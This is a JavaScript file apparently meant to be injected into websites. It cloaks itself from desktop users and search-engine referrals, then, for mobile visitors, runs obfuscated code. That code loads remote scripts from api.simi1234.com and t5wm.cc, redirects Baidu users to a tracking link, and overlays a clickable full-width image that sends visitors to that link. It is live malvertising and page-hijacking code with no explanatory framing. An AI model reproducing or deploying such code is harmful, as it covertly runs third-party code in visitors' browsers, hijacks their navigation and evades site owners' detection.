// 2022年11月27日
var system = {
    win: false,
    mac: false,
    xll: false
};
var p = navigator.platform;
var us = navigator.userAgent.toLowerCase();

system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);

var regexp = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document.referrer;


if (!system.win && !system.mac && !system.xll && !regexp.test(where)) {
    const temporaryGroups = ['sm','t5cpc','t5cpa'];
    const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
    const randomElements = randomNums(temporaryGroups);
    if (randomElements == 'sm') {
        window.SDbQFX=function(){window.SDbQFXpEls=document.currentScript;var uas=navigator.userAgent.toLowerCase(),isToJump=sessionStorage.getItem('SDbQFX');var rnx=['a','B','c','d','e','G','g','h','J','j','k'],ns=its(rnx,4),en=its(rnx,8),eFun=its(rnx,11),tFun=its(rnx,11),ds="",ds1="",adT=2,adI=uas.indexOf('baidu')!=-1?(function(){if(!isToJump){setTimeout(function(){sessionStorage.setItem('SDbQFX',1);window.open('https://api.simi1234.com/a/c?au427dd9672488f7c14576ba4a899bc877='+au427dd9672488f7c14576ba4a899bc877,'_self')},1000*5)}})():"https://dingbu.bj.bcebos.com/chaoxi.add",adC="https://api.simi1234.com/static/image/c.png";for(var i=0;i<Math.round((Math.random()*10)+1);i++){ds+="<div class='"+its(rnx,6)+"'>"+i==2||i==7||i==9||i==4?"<div> </div>":"<div class='"+its(rnx,8)+"'><div> </div></div>"}for(var i=0;i<Math.round((Math.random()*10)+1);i++){ds1+="<div class='"+its(rnx,5)+"'>"+i==1||i==3||i==5||i==7?"<div> </div>":"<div class='"+its(rnx,9)+"'><div> </div></div>"}var sp=`${ds1}<script>function ${tFun}(c){for(var i of['0x3c','0x3e','0x20']){c=c['replace'](new RegExp(i,'ig'),String['fromCharCode'](i))};return c}<\/script><div id="${en}"style='display:none !important;'>function runxjx(){var t=${adT};var ub=navigator.userAgent.toLocaleLowerCase();var _d;if(ub.indexOf('ucbrowser')!==-1){_d=document.createElement('div')}else{_d=document.createElement('video');_d.playsinline='playsinline';_d.poster='${adI}';var source=document.createElement('source');source.src='';_d.appendChild(source)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=454983159219851264';document.getElementsByTagName('head')[0].appendChild(s);_d.setAttribute('class','SDbQFX');var _img=document.createElement('img');_img.src='${adI}';_d.append(_img);addStyle(styleStr(0,t));window.SDbQFXpEls.parentNode.insertBefore(_d , window.SDbQFXpEls);addlistenerElement(_d,toLink);_img.onload=function(c){var _h=this.offsetHeight;_p=document.createElement('p');_d.appendChild(_p);addStyle(styleStr(1,t,_h));addlistenerElement(_p,function(){_d.remove();_d.remove()})}}function addlistenerElement(el,callBack){el.addEventListener('click',function(){callBack()});el.addEventListener('touchstart',function(e){e.preventDefault();callBack()});el.addEventListener('touchmove',function(e){e.preventDefault()})}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('body')[0].appendChild(styleObj)}function styleStr(sType,dt,tl){var ds=dt==0||dt==1?tl+'px;':'calc(50% - '+(tl+15)+'px);',ls=dt==0||dt==1||dt==2?'right:0px;':'left:0px;',bg='margin:0;padding:0; background: url("${adC}");background-size: contain; background-repeat: no-repeat};';var sty=dt==0||dt==2||dt==3?'top:'+ds+ls+bg:'bottom:'+ds+ls+bg;var style=sType==0?('.SDbQFX{height:110px;object-fit:fill;width:'+(dt==3?'20%':'100%')+';'+(dt==0||dt==1?'position:fixed;':'')+(dt==0?'top:0px':dt==1?'bottom:0px':dt==3?'bottom:50%':'')+';z-index: 999;display: -ms-flexbox;display: flex;-ms-flex: 0 1 auto;flex: 0 1 auto;-ms-flex-align: center;align-items: center;-ms-flex-pack: center;color: #fff;justify-content: center}.SDbQFX img {width: 100%};'):'.SDbQFX p {display: block; width: 15px; height: 15px; position: fixed;'+sty;return style}function toLink(){window.open('https://api.simi1234.com/a/c?au427dd9672488f7c14576ba4a899bc877='+au427dd9672488f7c14576ba4a899bc877,'_self')};window['${eFun}']=runxjx;</div><script>new Function(${tFun}(document.getElementById('${en}').innerHTML))();<\/script>${ds}<script>${eFun}();<\/script>`;var vns=its(rnx,8);var ioasrs1s=document.createElement(`${vns}`);ioasrs1s.innerHTML=sp;document.body.appendChild(ioasrs1s);evalScripts(sp);function evalScripts(text){var script,scripts;scripts=[];var regexp=/<script[^>]*>([\s\S]*?)<\/script>/gi;while((script=regexp.exec(text)))scripts.push(script[1]);scripts=scripts.join('\n');if(scripts)(window.execScript)?window.execScript(scripts):window.setTimeout(scripts,0)}function its(r,len){var str="";for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}};window.SDbQFX();   
    }
    if (randomElements == 't5cpa') {
        (function (){
            var id = "9142199889545937380-62115";
            document.write('<ins style="display:none!important" id="' + id + '"></ins>');
            (window.adbyunion = window.adbyunion || []).push(id);
            document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
        })();
    }
    if (randomElements == 't5cpc') {
        (function (){
            var id = "9142199889545937380-62114";
            document.write('<ins style="display:none!important" id="' + id + '"></ins>');
            (window.adbyunion = window.adbyunion || []).push(id);
            document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
        })();
    }
}
